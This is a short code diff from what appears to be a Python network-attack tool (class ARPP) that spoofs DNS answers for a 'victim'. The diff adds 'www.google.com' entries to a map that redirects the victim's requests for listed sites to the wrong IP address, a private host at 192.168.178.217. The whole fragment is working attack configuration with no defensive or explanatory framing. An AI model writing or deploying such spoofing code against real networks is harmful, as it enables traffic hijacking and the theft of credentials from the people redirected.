@@ -452,6 +452,8 @@ class ARPP(object):
         """
         # a dictionary of sites that if the victim tries to access them they are directed to the wrong IP address
         target_sites_map = {b"google.com.":"192.168.178.217",\
+            b"www.google.com.":"192.168.178.217",\
+            b"www.google.com":"192.168.178.217",\
             b"test.nl":"192.168.178.217"}
         target_sites=list(target_sites_map.keys())
         fake_ips = list(target_sites_map.values())
